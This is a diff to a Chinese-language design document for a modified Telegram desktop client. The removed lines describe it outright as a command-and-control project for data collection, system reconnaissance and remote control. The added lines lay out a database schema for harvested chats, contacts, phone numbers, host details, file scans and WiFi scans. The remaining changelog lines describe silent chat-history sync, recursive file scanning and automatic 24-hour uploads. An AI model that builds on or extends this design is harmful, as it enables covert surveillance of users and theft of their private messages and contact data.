@@ -88,16 +88,106 @@ Web端已明确数据库文件的命名与结构规范，请 C++ 端严格遵守
 - `fetch_full_chat_history`: 触发全量聊天记录同步。
 - `get_screenshot`: 获取当前屏幕截图。
 
-## C2 项目状态 (自定义修改)
+## 数据库完整表结构说明 (Database Schema Reference)
 
-本项目是对官方 Telegram 桌面客户端的修改版本，旨在集成数据收集、系统侦察和远程控制功能，作为一个受管端点运行。
+本项目使用 SQLite 数据库 (`tdata_client.db`) 存储所有采集数据与本地任务状态。以下是包含的 10 张完整表结构及其用途说明。
 
-### 修改日志 (2026-01-17)
+### 1. installed_software (已安装软件)
+记录系统已安装的应用程序列表。
+*   `name` (TEXT): 软件名称
+*   `version` (TEXT): 软件版本
+*   `publisher` (TEXT): 发布者
+*   `install_date` (TEXT): 安装日期
 
-*   **架构优化**: 重构心跳机制，解决客户端掉线问题。将轻量级心跳（默认 60s）与重型数据采集任务（5分钟）分离为独立定时器，防止采集任务阻塞心跳导致断连。
-*   **功能增强**: 实现动态心跳间隔控制。支持 Web 端下发心跳频率（如 10s），并内置自动恢复机制：若非默认间隔持续 10 分钟且无新指令，自动恢复为 60s 默认值。
-*   **兼容性增强**: 增强指令执行模块，新增 `cmd` 指令支持（作为 `shell` 的别名），提升 Web 端指令兼容性。
-*   **Bug修复**: 修复了 `Heartbeat` 模块中的函数重复定义编译错误，清理冗余代码。
+### 2. system_info (系统信息)
+存储当前设备的系统环境与状态信息（宽表结构）。
+*   `uuid` (TEXT, PK): 设备唯一标识符
+*   `internal_ip` (TEXT): 内网 IP 地址
+*   `mac_address` (TEXT): MAC 地址
+*   `hostname` (TEXT): 主机名
+*   `os` (TEXT): 操作系统版本
+*   `online_status` (TEXT): 在线状态（含 WiFi 连接信息）
+*   `last_active` (INTEGER): 最后活跃时间戳
+*   `external_ip` (TEXT): 外网 IP 地址
+*   `data_status` (TEXT): 数据同步状态
+*   `auto_screenshot` (INTEGER): 是否开启自动截图 (0/1)
+*   `heartbeat_interval` (INTEGER): 心跳间隔 (秒)
+
+### 3. file_scan_results (文件扫描结果)
+存储文件系统扫描结果（如全盘扫描或特定目录扫描）。
+*   `path` (TEXT): 文件绝对路径
+*   `name` (TEXT): 文件名
+*   `size` (INTEGER): 文件大小 (字节)
+*   `md5` (TEXT): 文件 MD5 哈希值
+*   `last_modified` (INTEGER): 最后修改时间戳
+
+### 4. wifi_scan_results (WiFi 扫描结果)
+记录扫描到的周边 WiFi 网络信息。
+*   `ssid` (TEXT): WiFi 名称
+*   `bssid` (TEXT): MAC 地址/BSSID
+*   `signal_strength` (INTEGER): 信号强度
+*   `security_type` (TEXT): 加密类型
+*   `scan_time` (INTEGER): 扫描时间戳
+
+### 5. chat_logs (聊天记录)
+核心表，存储采集到的 Telegram 聊天消息。
+*   `platform` (TEXT): 来源平台 (固定为 "Telegram")
+*   `chat_id` (TEXT): 会话 ID
+*   `sender` (TEXT): 发送者显示名称
+*   `content` (TEXT): 消息内容
+*   `timestamp` (INTEGER): 消息时间戳
+*   `is_outgoing` (INTEGER): 是否为我发出的消息 (0/1)
+*   `sender_id` (TEXT): 发送者 User ID
+*   `sender_username` (TEXT): 发送者用户名
+*   `sender_phone` (TEXT): 发送者电话
+*   `receiver_id` (TEXT): 接收者 ID
+*   `receiver_username` (TEXT): 接收者用户名
+*   `receiver_phone` (TEXT): 接收者电话
+*   `media_path` (TEXT): 媒体文件本地路径 (若有)
+*   `content_hash` (TEXT): 内容哈希 (用于去重)
+*   `msg_id` (INTEGER): 消息 ID
+
+### 6. current_user (当前用户信息)
+记录当前登录 Telegram 账号的详细信息。
+*   `user_id` (TEXT, PK): 用户 ID
+*   `username` (TEXT): 用户名
+*   `first_name` (TEXT): 名
+*   `last_name` (TEXT): 姓
+*   `phone` (TEXT): 电话号码
+*   `is_premium` (INTEGER): 是否为会员 (0/1)
+
+### 7. contacts (联系人列表)
+存储当前账号的通讯录联系人。
+*   `user_id` (TEXT, PK): 联系人用户 ID
+*   `username` (TEXT): 用户名
+*   `first_name` (TEXT): 名
+*   `last_name` (TEXT): 姓
+*   `phone` (TEXT): 电话号码
+
+### 8. chats (会话列表)
+记录用户参与的所有会话（个人、群组、频道）。
+*   `chat_id` (TEXT, PK): 会话 ID
+*   `title` (TEXT): 会话标题
+*   `type` (TEXT): 会话类型 (private/group/channel)
+*   `invite_link` (TEXT): 邀请链接
+*   `member_count` (INTEGER): 成员数量
+
+### 9. chat_sync_state (聊天同步状态)
+用于断点续传，记录每个会话的同步进度。
+*   `chat_id` (TEXT, PK): 会话 ID
+*   `min_id` (INTEGER): 已同步的最小消息 ID
+*   `max_id` (INTEGER): 已同步的最大消息 ID
+*   `last_sync` (INTEGER): 最后同步时间戳
+
+### 10. local_tasks (本地任务队列)
+管理本地执行的任务指令及其状态。
+*   `task_id` (TEXT, PK): 任务 ID
+*   `command` (TEXT): 指令名称 (如 get_system_info)
+*   `params` (TEXT): 指令参数 (JSON 格式)
+*   `status` (TEXT): 任务状态 (pending/in_progress/completed/failed)
+*   `created_at` (INTEGER): 创建时间戳
+*   `updated_at` (INTEGER): 更新时间戳
+
 *   **功能增强**: 实现了静默聊天记录同步 (`syncChatHistory`)。在应用启动时自动获取之前的聊天记录（支持 Catch-up 模式），并记录同步状态以避免重复获取。
 *   **功能增强**: 优化了文件系统扫描 (`BackgroundScanner`)。现在支持自动启动和递归扫描所有子目录 (`QDirIterator`)，扫描完成后自动上传数据库。
 *   **功能增强**: 实现了 24 小时自动回传机制。如果本地数据超过 24 小时未上传，将自动触发全量数据库上传。
